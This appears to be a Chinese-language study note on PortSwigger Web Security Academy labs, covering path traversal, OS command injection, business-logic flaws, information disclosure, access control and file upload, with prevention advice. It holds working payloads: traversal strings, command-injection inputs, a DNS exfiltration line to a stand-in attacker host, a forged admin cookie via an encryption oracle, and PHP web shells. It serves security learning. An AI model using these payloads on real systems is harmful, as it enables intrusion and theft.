  * 限制了只能以 `/var/www/html` 开头，但是仍然存在 `../` 这种形式的绕过
  * 限制了文件后缀，例如 `.png` ，但可以通过 `filename=../../../etc/passwd%00.png` 这种形式绕过
* 限制了 `../` 这种形式，但可以通过 `....//` 或者 `....\/` 绕过，或者 `%2e%2e%2f` 、 `%252e%252e%252f`、`..%c0%af`、`..%ef%bc%8f` 这种转义绕过





# OS command injection



## 命令注入示例

假设一个购物网站使用如下URL查询库存：

```http
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

由于历史原因，系统中需要转换参数给如下程序来获取库存：

```sh
stockreport.pl 381 29
```

上面程序输出库存状态和商品说明返回给用户。由于没有防御命令注入，就可以使用如下方式注入命令：

```bash
& echo aiwefwlguh &
```

echo 命令会输出一些字符串，`&` 字符会分割命令，命令结果和错误消息随着程序一起返回：

```bash
Error - productID was not provided
aiwefwlguh
29: command not found
```

要注入的命令后面也添加 `&` 符号可以避免后续参数干扰命令注入。  



示例 lab：

```http
POST /product/stock HTTP/2
Host: 0a1c000104f5317a82527e02002700c8.web-security-academy.net
... omit ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

productId=%26%20whoami%20%26&storeId=2
```





## 获取信息命令

当确认存在命令注入漏洞后，就可以尝试获取一些环境相关信息：

| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |



## 盲注

很多应用程序存在命令盲注漏洞，不会返回输出到 HTTP 的 response 中。但结合不同的技术仍然可以加以利用。  

假设一个网站程序允许用户提交 feedback 消息，服务端程序生成一封邮件到网站管理员对应邮箱账户，内容通过 `mail` 程序发送：

```
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

执行结果不会通过 response 返回。  



### 延迟探测

可以通过一些触发延迟的命令探测盲注，例如 ping ：

```bash
& ping -c 10 127.0.0.1 &
```

上面命令执行产生大约 10s 左右延迟。  

示例 lab，通过提交脚注注入命令：

```http
POST /feedback/submit HTTP/2
Host: 0a5b0032035a47fd8002d503005a002c.web-security-academy.net
Cookie: session=WYRa56PEP9MHOjHfuokFUlcVVxO22u5s
Content-Length: 114
Content-Type: application/x-www-form-urlencoded

csrf=zXQPniKmbALnpFIbM3IlZRhlRG6eE3Ln&name=abc&email=a@b.c%26%20ping -c 10 127.0.0.1%20%26&subject=hhh&message=aaa
```





### 重定向输出探测

如果能够重定向输出到 web 网站目录下的文件，并且该文件可以通过 URL 访问到，就可以通过这种方式来探测。  

假设用户静态资源存放在 `/var/www/static`，可以尝试如下注入：

```bash
& whoami > /var/www/static/whoami.txt &
```

然后尝试访问 `https://vulnerable-website.com/whoami.txt` 读取结果。  

示例lab，网站将产品相关图片存放在`/var/www/images/` ，可以向该路径中重定向输出，然后检测：

```http
POST /feedback/submit HTTP/2
Host: 0a4d0066047606e68038531600460025.web-security-academy.net
Cookie: session=JW9IphfJTJtmdfzfUYTFKnYcqe9LJ4Dn

csrf=TD9edv5uLA2wijjBXmpdXHsYRnNWqldZ&name=aa&email=att%40ack.er%26%20whoami > /var/www/images/whoami.jpg%20%26&subject=def&message=hahahah
```

请求对应资源：

```http
GET /image?filename=whoami.jpg HTTP/2
Host: 0a4d0066047606e68038531600460025.web-security-academy.net


```

response:

```http
HTTP/2 200 OK
Content-Type: image/jpeg
Set-Cookie: session=qhYgnRGnnPKZ1VLarQewCDanSuMs0wfY; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 13

peter-nojGLI

```



### OAST 带外管理

如果能够注入命令通过触发带外网络与你掌握的主机系统交互，可以尝试类似命令：

```bash
& nslookup kgji2ohoyw.web-attacker.com &
```

攻击者可以通过监控对应特定域名的 nslookup 的查询记录探测命令是否成功注入。  

还有一种可以通过带外管理携带信息的 nslookup 方式：

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

如果成功通过带外管理触发 nslookup，这会导致 DNS 产生类似如下记录：

```bash
wwwuser.kgji2ohoyw.web-attacker.com
```

示例lab，提示需要 collaborator，但尝试往xxx.burpcollaborator.net地址发送 nslookup 就能够触发解决lab（另一个携带whoami 信息的lab无法通过此方法解决） ：

```http
POST /feedback/submit HTTP/2
Host: 0a6b00fc0419b9d680d02652008c006b.web-security-academy.net
Cookie: session=LjvS1cga0eZ5osm2lNbFLWxwMCdDofu3

csrf=Df1HHp9vnB7L4QSbJa8CnImlOdhcJ1wx&name=attacker&email=b%40ad.man%26%20nslookup skjdlsjdlsjdlsjld.burpcollaborator.net%20%26&subject=ping&message=ssssssss
```





## 注入命令的方式

可以使用很多 shell 元字符进行命令注入攻击，这些命令在 Windows、UNIX 中都可以使用，以链式命令的方式注入：

```bash
&
&&
|
||
```

UNIX 中可以使用的：

- `;`

- Newline (`0x0a` or `\n`)

- ```
  ` injected command `
  $(injected command)
  ```

不同的元字符行为有差异，可能在不同场景下影响效果。  

有时注入命令是在原始命令的引号中，此时需要在合适的 shell 元字符注入之前使用 `"` 、`'` 之类的终止引用的上下文。  



## 预防命令注入

最有效的是永远不在应用层代码中调用 OS 命令，使用更安全的平台 API 来实现相关功能。  

如果必须使用用户的输入来调用 OS 命令，必须进行强输入验证，一些场景中的示例：

* 针对白名单做输入验证
* 验证输入是一个数字
* 验证输入只包含字母数字字符，不允许空格或其它语法

不要尝试转义 shell 元字符净化输入，在实践中很容易出错且容易被绕开。  







# Business logic 业务逻辑漏洞



## 产生原因和影响

通常是设计和开发团队对用户和应用之间的交互做了有缺陷的假设，可能是验证输入不充分、逻辑不够严谨等。越复杂的系统越容易出现，当多个模块的设计者或开发人员对其它交互的组件理解不深，做出一些错误假设，无意之间就会引入严重逻辑缺陷。业务逻辑漏洞的影响和功能相关，可能很轻微，也可能很严重，例如认证、金融交易之类的漏洞通常容易产生严重影响。  



  

常见的错误假设有：

* 用户只会用浏览器
* 用户不会修改隐藏元素字段
* 用户会按照顺序执行
* 用户不会重复提交
* 用户不会输入负数



复杂系统出现逻辑漏洞的主要原因：

* 代码量庞大
* 团队分工导致彼此了解不足
* 未文档化
* 功能交互复杂
* 测试覆盖不足



常见避免逻辑漏洞的方法：

* 服务端校验所有输入，永远不信任客户端
* 明确文档化假设，将所有认为“用户会...”的假设记录下来
* 整体性理解，开发者要了解自己模块之外的内容
* 异常路径测试
* 代码审查
* 状态机管理，多步骤流程用状态机，拒绝非法状态转换





## 示例

### 过度信任客户端控制

参考 Authentication 中的多因子实验。

### 处理异常输入的缺陷

实验一：购物车没有对减去商品数量做剩余数量检查，当购物车中不存在该商品时仍处理请求，通过 burpsuite 拦截修改，利用 Repeat 发送多个减去商品的请求，使得购物车中商品数量出现了负值，再加上其它商品就可以凑出较小金额进行下单。



实验二：整数溢出，购物车应用的总价使用有符号32位整数来存储，超过整数最大范围会溢出变为负值，虽然做了负值校验，不能下单，但是通过构造请求，让购物车的值恰好超过0值一些，可以完成使用少量余额下单。



实验三：应用程序对邮件地址的处理存在“不一致”：发送确认邮件的邮件服务器会使用完整的地址，而用于权限判断的应用程序后端则会把地址截断到 **255 个字符**，构造一个超长邮箱，让后端误以为是内部员工，但邮件会发送到攻击者的域名邮箱中：

```
wienerpeterxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxrxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxrxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx@dontwannacry.com.exploit-0aea0039047564aa8377000901b00068.exploit-server.net
```





### 对用户行为的假设

* Trusted users won't always remain trustworthy
  * 实验示例：根据用户邮箱后缀判断是否为内部用户，但未对注册成功的外部用户修改邮箱做校验，导致可以修改为内部邮箱，从而访问管理页面
* Users won't always supply mandatory input
  * 实验示例：修改密码时传递当前密码，会对比当前密码是否正确，但是未传递当前密码也可以修改成功
* Users won't always follow the intended sequence
  * 实验示例：用户登录需要通过双因子，密码+邮箱验证码，攻击者已经获取到B用户密码，使用自己的A用户登录后发送验证码进行验证，进入账户主页记住URL并登出自己账号，使用B用户账号登录，在双因子验证页面，手动修改URL为之前记录的URL值
  * 有时候按照非预期的顺序提交请求去测试程序，尝试跳过不同步骤中的请求、删除部分参数、返回早期的步骤、重复某些步骤等，这种测试通常会引发异常，要密切关注异常和错误信息，看程序是否存在漏洞或攻击面。
  * 实验示例，非预期顺序：当购物车中有物品，手工修改URL为 `cart/order-confirmation?order-confirmed=true` 访问确认页面，服务器就认为已经成功付款。
  * 实验示例，Authentication 状态机缺陷：服务器维护了一个状态机，假设用户登录的顺序为：输入账号密码、选择角色、进入账号主页，可能在内存或者 session 中维护了状态变量，但未作非法状态转换检测，用户登录后跳过选择角色步骤，直接强制访问 `/admin` 管理页面，服务器没有阻止并使用默认角色初始化用户状态，导致用户获取管理功能。 
    * 正常流程：`POST /login` → `GET /role-selector` → `POST /role-selector` → `GET /my-account`.
    * 攻击流程：`POST /login` → `GET /admin`（跳过中间的角色选择步骤）.
    * 根本原因：服务器没有在访问 `/admin` 时校验用户是否已经完成了角色选择。它错误地信任了“用户访问 `/admin` 就意味着他们已经完成了前面的步骤”。当这个假设不成立时，服务器会使用一个未初始化的默认状态，而这个状态恰好拥有过高的权限。



### 特定领域缺陷

示例实验一：反复利用不同优惠券减直到余额为零。





示例实验二：利用优惠券折扣购买礼品卡，再使用礼品卡，无限刷余额。





### 提供加密预言机

当用户可控的输入被加密，并且生成的密文以某种形式提供给用户。就可能出现危险的场景，被称为“encryption oracle(加密预言机)”（在密码学中，指一个能对任意输入返回加密结果的黑盒系统）。攻击者可以利用这个输入加密任意数据，当应用程序存在一个反向功能的可控输入，攻击者甚至能够解密其他数据识别结构。  



实验示例：

一个博客应用，登录界面有一个保持登录功能，如果勾选，会传递一个 stay-logged-in=on 参数：

```http
POST /login HTTP/2
Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
Cookie: session=TFWkrJlgS9eTbtnRdLPha12l0RTZxNFL

...omit...

csrf=WKJ2oZS9bxbRpkjVMYhEGe4v0rYR4cfy&username=wiener&password=peter&stay-logged-in=on
```

返回的cookie 中则包含了 stay-logged-in 的条目，是一个加密字符串：

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY; Secure; HttpOnly; SameSite=None
... omit ...

```



在文章提交评论的接口，将评论内容以 POST 方法参数提交

```http
POST /post/comment HTTP/2
Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
Cookie: stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
Content-Length: 120

... omit ...

csrf=oRFcBXMXzfDCKBgYKbko0GxepdqQuh56&postId=6&comment=comment+content&name=title&email=a%40b.c&website=http%3A%2F%2Fd.e
```

正常返回：

```http
HTTP/2 302 Found
Location: /post/comment/confirmation?postId=6
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

如果填写错误邮箱地址，页面会提示：`Invalid email address: xxxxxx`，返回的 cookie 中包含了 notification，即加密后的通知内容，如果有 notification，例如上面邮箱格式错误，html 页面会根据下面 cookie  解码成明文`Invalid email address: wrong_address`。

```http
HTTP/2 302 Found
Location: /post?postId=6
Set-Cookie: notification=AFfitMYDEfxvYVJSKNG%2fbK58%2fJyS3dBtdLuag8x4zxQdHf2OEZ1pTbgXxDTRFjrP; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

这个评论功能就属于加密预言机：

* 加密：将我们想要加密的字符串通过邮箱参数传递给此接口，返回的 cookie 中包含了加密字符串

* 解密：将符合格式的密文配置到 cookie 中的  notification 字段，请求对应文章页面，会展示在通知区域

  * 例如 

    ```http
    GET /post?postId=6 HTTP/2
    Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
    Cookie: notification=AFfitMYDEfxvYVJSKNG%2fbK58%2fJyS3dBtdLuag8x4zxQdHf2OEZ1pTbgXxDTRFjrP; stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
    ```

    

通过访问不同页面，可以发现服务端判断用户登录状态是基于 stay-logged-in 这个字段，尝试将这个字段作为参数 notification 的值以 url 形式解码后传递给解密页面：

```http
GET /post?postId=6 HTTP/2
Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
Cookie: notification=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0=; stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
```

得到结果是：

```html
<header class="notification-header">
    wiener:1789885263983                    
</header>
```

可以发现是`用户名:时间戳`的形式，如果可以解密`administrator:时间戳` 就可以以管理员身份登录管理页面。    

在评论功能的接口提交请求：

```http
POST /post/comment HTTP/2
Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
Cookie: stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY

csrf=oRFcBXMXzfDCKBgYKbko0GxepdqQuh56&postId=6&comment=something&name=common_title&email=administrator:1789885263983&website=http%3A%2F%2Fd.e
```

获取结果：

```http
HTTP/2 302 Found
Location: /post?postId=6
Set-Cookie: notification=AFfitMYDEfxvYVJSKNG%2fbOIuzH%2bGCIgiEbuDSMt6xQ6%2fnJ%2fZ7OxcK9dOi4mwTniT9GEBBE1mbFfaPSos%2fchJaQ%3d%3d; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```

携带返回的 cookie 访问文章页面有 `Invalid email address: administrator: 1789885263983 ` 这样的通知，需要想办法将前面 23 个字符去除： 

```
Invalid email address: 
```

使用 burpsuite 的 decoder 解码，先 url 解码再 base64解码后去除前 23 个16进制字符

![image-20260920145018607](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260920145018607.png)

再将删除后字符串以 base64 加密：

![image-20260920145138583](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260920145138583.png)

得到：K9dOi4mwTniT9GEBBE1mbFfaPSos/chJaQ== ，将此值作为cookie的 notification 值请求文章页面，出现报错，提示这个值必须是填充为 16 的倍数：

```html
<h4>Internal Server Error</h4>
<p class=is-warning>Input length must be multiple of 16 when decrypting with padded cipher</p>
```



原先有23个字符再填充9个字符再次请求：

```http
POST /post/comment HTTP/2
Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
Cookie: stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
... omit ...

csrf=oRFcBXMXzfDCKBgYKbko0GxepdqQuh56&postId=6&comment=something&name=common_title&email=xxxxxxxxxadministrator:1789885263983&website=http%3A%2F%2Fd.e
```

响应：

```http
HTTP/2 302 Found
Location: /post?postId=6
Set-Cookie: notification=AFfitMYDEfxvYVJSKNG%2fbJT7KyI0%2bpuGBYTDG6sx8gd9KUO8KrTU%2f9d1nNa7WCBCPTNxpHb8gucK9fGm1vH3FQ%3d%3d; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

将响应中字段再次拿到 decoder 中解码，这次去除前 32 位，之后再次 base64 加密，得到结果 `fSlDvCq01P/XdZzWu1ggQj0zcaR2/ILnCvXxptbx9xU=` 进行请求：

```http
GET /post?postId=6 HTTP/2
Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
Cookie: notification=fSlDvCq01P/XdZzWu1ggQj0zcaR2/ILnCvXxptbx9xU=; stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
```

页面通知内容变为：

```html
<header class="notification-header">
            administrator:1789885263983                    
</header>
```

说明解密程序能够正常识别并转换字符串，将加密字符串放到 `stay-logged-in` 字段，并删除 `session` 字段后请求 `/admin` URL，

![image-20260920151836212](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260920151836212.png)

可以成功进入管理页面。



### 邮件地址解析差异

参考：https://portswigger.net/research/splitting-the-email-atom

![img](../upload/2026-07-06-PortSwigger_BurpSuite/3665-article-how-encoded-word-works.png)

示例实验，必须使用 @ginandjuice.shop 后缀的内部邮箱才能注册，利用上面链接给出的方法：

尝试 utf8 编码报错：

```
=?utf-8?q?=61=62=63?=wiener@ginandjuice.shop
```

尝试utf7可以正常注册：

```
=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop
```

下面开始尝试利用邮件地址解析差异，将邮件发送到 exploit-server 中邮箱：

```
Q编码和utf7字符集：
=?utf-7?q?attacker&AEA-exploit-0a5f002003a244b780b9669a0130006f.exploit-server.net&ACA-?=@ginandjuice.shop

或者使用 base64 编码 utf7字符集混合：
=?utf-7?b?d2llbmVyJkFFQS1leHBsb2l0LTBhNWYwMDIwMDNhMjQ0Yjc4MGI5NjY5YTAxMzAwMDZmLmV4cGxvaXQtc2VydmVyLm5ldCZBQ0Et?=@ginandjuice.shop

```

可以正常收取到邮件。  



## 预防



* 确保开发人员、测试人员理解应用软件服务的领域
* 避免对用户或其它关联的应用程序的行为做出隐式假设



一些最佳实践：

* 为所有的交互和工作流，维护清晰的设计文档和数据交互流程图，注意其中各个步骤中做的任何假设。
* 尽可能写清晰易懂的代码。难以理解的代码，就难以注意到其中的逻辑漏洞。
* 注意每个使用的组件所引用的其它代码。考虑以恶意的方式操作这些依赖关系，可能产生的结果。







# Information Disclosure 信息泄露

## 概念及影响

信息泄露是指网站无意中向用户泄露敏感信息。根据上下文的不同，可能包括：

* 其他用户数据
* 敏感的商业信息
* 网站架构及基础设施相关信息



一些示例：

* `robots.txt` 、`sitemap.xml` 
* 网站源码的临时备份文件
* 错误消息中提示了数据库表、字段等
* 不必要的暴露敏感信息，例如用户信用卡详情
* 源码中硬编码方式存储了 API 密钥、IP 地址、数据库凭证等
* 在应用中以微小的差异反馈不同资源、用户名等信息是否存在



**产生原因**  

* 没有从公共上下文中移除内部上下文。例如开发者的注释。
* 网站及相关技术的不安全配置。例如未禁用 debug。
* 应用程序自身设计缺陷。网站在发生不同错误做出不同的响应，帮助攻击者判断来枚举信息。



**影响**  

信息泄露的影响取决于网站应用的目的，也取决于能获取的信息类型。例如直到网站框架和版本，如果框架存在漏洞但对应版本已经修复则用途有限，但如果存在已知漏洞的旧版本利用价值就很高。需要一些方法评估测试信息泄露的严重性。    





## 测试方法

### fuzzing （模糊测试）

如果找到一些有用的参数，可以尝试基于字典通过一些工具提交和构造不同类型的模糊数据，查看效果。  

常见的有：

* wfuzz、ffuf（kali 系统中自带）
* Burp Intruder
* Gobuster
* Dirb
* Dirsearch
* DirBuster

常用的字典：

* SecLists ，安装后位于 /usr/share/seclists/ 下
* kali 自带的位于 /usr/share/wordlists/dirb/ 



1. 通过向参数添加不同的 Payload 能够快速、大量的添加不同字符串来测试不同输入

2. 观察对比 HTTP 状态码、响应时间、长度等信息，识别差异

3. 通过 grep 之类匹配规则识别一些关键信息，例如 error、invalid、SELECT 等

   



### Burp Scanner、Engagement tools

专业版收费，有一些 Search、Find comment、Discover content 之类的功能。



### 改变信息响应

有时错误信息会根据不同输入发生不同变化，有些情况下可以利用来提取数据。有很多方法，例如尝试让应用对特定数据执行无效操作，提交一些无效的参数值可能会导致堆栈跟踪或者 debug 的响应信息。





## 常见的信息泄露源

* 网站爬虫文件。很多网站为了搜索引擎或其他类型的爬虫程序，声明了 `/robots.txt` 或者 `/sitemap.xml` ，其中可能包含敏感信息 URL。
* 目录列表。一些网站被配置成如果没有 index 类索引文件，就列出目录上下文信息，这种情况下攻击者可以分析查找各个目录下资源文件。
* 开发者注释。有时开发者注释的信息会包含在 html、md 等文件中，虽然用户不会直接可见，但通过 burp、开发者调试工具可以找到。
* 错误消息。最常见的一种信息泄露原因。
* 调试数据。为了方便调试，例如 phpinfo，可能包含很多对攻击有用的信息，有时保存在单独的文件中，如果攻击者获取到，可以帮助理解程序运行时状态，提供线索来构造进一步的探索和攻击，例如：
  * 关键变量的值，例如 session
  * 后端组件的主机名、凭证
  * 服务器上目录、文件名
  * 用于加密的客户端传输数据相关凭证密钥
* 用户账户页面。用户账户页面中本身就包含很多敏感信息，每个用户应当只能访问到自身账户所相关的信息，但有些应用存在逻辑漏洞，导致攻击者可以查看到其他用户的信息。
  * 例如 `GET /user/personal-info?user=carlos` 返回的是 carlos 个人页面，如果没有其它机制攻击者随意修改参数查看其他用户页面
  * 很多应用会采取更多措施，例如校验 session 和用户是否匹配，但实践中可能存在可以绕过的漏洞，参考 IDOR 漏洞
* 备份文件。
  * 通过获取备份文件可以更容易理解应用的行为，构造更高级别的攻击，甚至其中可能包含硬编码的与后端组件交互的密钥和凭证。
  * 有时文本编辑器会生成临时文件，例如文本编辑器曾编辑过的文件，会存在 `~` 结尾的或者 `.` 开头 + `.swp` 结尾的临时文件。
  * 一旦获取了源代码的备份文件，有时还可以以原先几乎不可能的方式利用，例如 反序列化漏洞
* 不安全的配置。
  * 网站由于不安全的配置存在漏洞，尤其是使用第三方的技术或组件，大量的配置或者变量无法被实施者充分理解。
  * 有时是忘记在生产中禁用调试选项，例如 HTTP 的 `TRACE` 方法，如果启用 web 服务器将在 response 中回显收到的确切信息，这种行为有些场景些会导致反向代理等中间件附加的 header 被泄露。
* 版本控制历史。几乎现在所有网站都会使用某种版本控制工具，最常见的就是 git，其所有版本控制数据存放在 .git 目录中，有时处于疏忽该文件被暴露在网站下被访问，通过浏览 /.git 就可以访问到。可以下载整个 .git 目录到本地，通过 git 工具浏览对应的版本控制历史，从提交日志记录和小段的代码中寻找漏洞。  





## 预防

一些最佳实践：

* 确保参与制作开发网站的人员都完全了解什么类型的信息是敏感信息。  
* 作为 QA 或者构建流程的一部分，审计代码是否存在信息泄露的可能性。
* 尽可能地使用通用错误消息。
* 检查生产环境是否开启了调试、诊断功能。
* 确保完全理解了所引用的任何第三方技术配置和安全影响。花时间检查和禁用不需要的任何功能和设置。







# Access Control/ IDOR 访问控制失效



## 概念

访问控制是约束用户可以执行被授权的动作、可访问授权的资源。

* Authentication 验证用户身份
* Session management 标识通过验证的用户，用于后续的其它请求
* Access control 访问控制在用户执行操作时验证他们拥有的权限



### Vertical access controls 垂直访问控制

不同级别角色用户的权限，例如普通用户、管理员、超级管理员。




### Horizontal access controls 水平访问控制

不同用户的权限，例如A用户、B用户，只能访问属于自己的资源。



### Context-dependent access controls 依赖上下文的控制

依赖于上下文状态的访问控制，例如根据是否购买会员展示不同内容、购物车下单依赖商品库存状态等。





## 访问控制失效常见类型

### Vertical privilege escalation 垂直提权

如果用户能够获取或者访问到未授权的功能、资源，就属于垂直提权。  



常见漏洞类型：

* Unprotected functionality：没有对敏感功能进行限制访问，或者在一些资源中存在泄露，示例：

  * 任何用户都可以访问 `https://insecure-website.com/admin ` 
  * 将管理 url 卸载了robots 中，`https://insecure-website.com/robots.txt` 
  * 管理URL做了一些随机化处理，例如 `https://insecure-website.com/administrator-panel-yb556`，但是在一些资源中会泄露地址，例如帖子、评论等功能中展示管理地址

* Parameter-based access control：一些应用将在验证用户权限或者角色后，将下一步处理的信息参数化，存放在用户可以控制的位置，例如

  * 隐藏元素中，例如配置了 hidden 属性的 input 元素

  * cookie 中

  * 参数集合

    * 示例：

    ```
    https://insecure-website.com/login/home.jsp?admin=true
    https://insecure-website.com/login/home.jsp?role=1
    ```

* Platform misconfiguration：一些应用针对用户角色限制了 URL 、HTTP 请求方法，这种情况下各种出错都可能导致访问控制被绕过。

  * 例如 `DENY: POST, /admin/deleteUser, managers` 这样一条配置限制了非 managers 组中的用户提交 POST 请求到该 URL。

  * 一些应用框架支持非标准的 HTTP 请求头，可以覆盖 HTTP 请求中的 URL，例如 `X-Original-URL` 和 `X-Rewrite-URL`。在这种场景下，可以使用如下请求绕过

    ```http
    POST / HTTP/1.1
    X-Original-URL: /admin/deleteUser
    ...
    ```

  * 一些框架支持同一接口处理多种类型的请求，自动进行转换，此时访问控制可以通过 `GET` 请求被绕过。

* URL-matching discrepancies：网站传入的请求和定义的 endpoint 匹配时，可能存在差异：

  * 大小写不一致会被认为同一端点，但访问控制可能遗漏，此时就会被绕过
  * 对结尾`/`分隔符处理的不同，也可能被利用来绕过





### Horizontal privilege escalation 水平提权

水平提权是指通过漏洞访问到不属于自身用户的资源。  

可以使用与垂直提权类似的利用方法：

* 利用参数，例如：`https://insecure-website.com/myaccount?id=123` 这个 URL 通过传送的 id 来判断用户身份，修改id 后会进入其它用户视图

* 有的网站使用 hash 用户 id，以避免被攻击者猜测出来，但存在泄露 id 的功能或者页面，例如评论、博客作者之类，或者在一些页面中隐藏用户 id 用于其它功能。

  



### Horizontal to vertical privilege escalation 水平提权到垂直提权

如果通过水平提权获取到高等级用户的账户，例如管理员，就属于水平提权转变为垂直提权。  

​	

### Insecure Direct Object Reference(IDOR) 不安全对象引用

当应用通过用户的输入来直接访问对象时，就可能出现 IDOR 漏洞，曾经在 OWASP 2007 TOP Ten 列表。  

示例：

* 直接引用数据库对象漏洞，一个使用 URL 检索数据库来访问用户页面，例如 `https://insecure-website.com/customer_account?customer_number=132355` ,如果没有其它限制，通过修改 `customer_number` 的值就可以查看其它用户页面。  
* 直接引用静态文件漏洞，假设某网站将聊天信息使用递增顺序的文件名保存到磁盘上，允许用户通过下载文件来检索记录，例如`https://insecure-website.com/static/12144.txt` ，攻击者修改文件名就可以检索其它用户数据。



### 多步骤处理漏洞

很多网站的重要功能实现会被拆分为多个步骤，通常发生在：

* 页面存在多个输入值或者选项
* 提交之前用户需要检查、确认

示例，管理员页面存在更新用户权限的功能，由如下步骤组成：

* 加载包含用户现有详情信息的表单
* 点击提交按钮
* 检查改动内容并确认

假设在前两步都进行了严格的权限校验，但在第三步遗漏了，攻击者就可以利用此步骤来获取未授权的操作。  



### 基于 referer 的访问控制

一些网站基于 `Referer` 头参数来判断是否有权限。例如对 `/admin/deleteUser` 发起一个请求，如果 `Referer` 是来自 `/admin` 则放行，这样就给攻击者留下了漏洞，通过控制 `Referer` 的值来绕过验证。  



### 基于地理位置的访问控制

根据不同国家、省市(州)的法律法规，有些应用会限制访问来源的地理位置，通常可以通过代理、VPN 等手段绕过。  



## 预防



* 永不依赖代码混淆作为权限控制
* 除了打算做为公共访问的资源，其它资源默认拒绝访问
* 尽可能使用单一应用范围内的强制访问控制
* 在代码层面，强制要求开发人员为每个资源声明访问控制权限，并配置为默认拒绝
* 全面详细的检查和测试，确保访问控制符合设计预期





# File Upload 文件上传

当一个网站应用允许用户上传到文件系统中，但没有足够的检查手段，就会导致恶意文件上传漏洞，攻击者可能会利用该漏洞上传服务端脚本开启远程代码执行。  

## 影响

文件上传漏洞的影响一般取决于这些因素：

* 网站未能正确验证文件的哪些方面，大小、类型、内容等对此的影响各不相同
* 对于上传成功的文件的限制

在最坏的情况下，

* 如果对类型没有正确验证会导致上传 `.php` 、`.jsp` 之类的可执行代码，
* 文件名未能正确验证会导致非法文件被上传覆盖正常文件，甚至通过路径穿越的形式上传到有权限的系统位置
* 文件大小未能正确验证，可能会导致磁盘被占满，潜在的 DOS(denial-of-service)。







## 简单利用示例

最坏的场景下，文件上传功能没有做任何限制，导致可以上传可执行代码类型的文件。  

例如：

* php 代码 `<?php echo file_get_contents('/path/to/target/file'); ?>` ，一旦这个文件被上次就可以读取指定目录中文件数据。
* 更常见的是结合URL的系统命令执行，上传文件包含类似：`<?php echo system($_GET['command']); ?>` 的内容，攻击者通过 `GET /example/exploit.php?command=id HTTP/1.1` 这种形式调用



## 常见漏洞

### 文件类型校验缺陷

很多场景下上传文件的 html 是使用 `POST` 方法上传 `application/x-www-form-urlencoded` 上下文类型（content type），对于图片、PDF 等二进制文件，通常使用 `multipart/form-data` 上下文类型。  

示例请求：

```http
POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--
```

上面请求中使用 `Content-Disposition` 分割每一段内容，每段单独有一个 `Content-Type` 指定数据类型，当服务器以来此字段判断文件类型而不检查文件内容时，就会存在漏洞，导致恶意文件被上传。





### 阻止文件执行

作为一种预防手段，服务器可以配置仅执行 MIME 类型的脚本，其他类型文件返回错误或者直接将内容以消息形式返回。

示例：

```http
GET /static/exploit.php?command=id HTTP/1.1
    Host: normal-website.com


    HTTP/1.1 200 OK
    Content-Type: text/plain
    Content-Length: 39

    <?php echo system($_GET['command']); ?>

```

这种手段能最大程度上禁止 web shell 的创建，但容易存在泄露源码的风险。  







### 文件类型黑名单设置不充分



#### 覆盖服务器配置

